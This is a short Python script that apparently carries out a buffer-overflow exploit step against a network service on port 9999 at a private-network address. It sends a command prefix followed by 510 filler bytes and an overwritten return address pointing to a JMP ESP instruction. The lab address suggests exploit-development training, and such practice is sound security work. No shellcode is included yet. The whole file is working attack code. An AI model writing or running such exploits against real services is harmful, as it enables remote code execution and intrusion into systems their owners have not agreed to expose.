#!/usr/bin/python3
import sys
import socket
from time import sleep

# our JMP ESP address is at  0x311712f3

buffer = b"A" * 510 + b"\xf3\x12\x17\x31"

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.10.4', 9999))
        payload = b'shitstorm /.:/' + buffer
        sock.send(payload)
        sock.close()
    except:
        print("Error connecting to the server")
        sys.exit()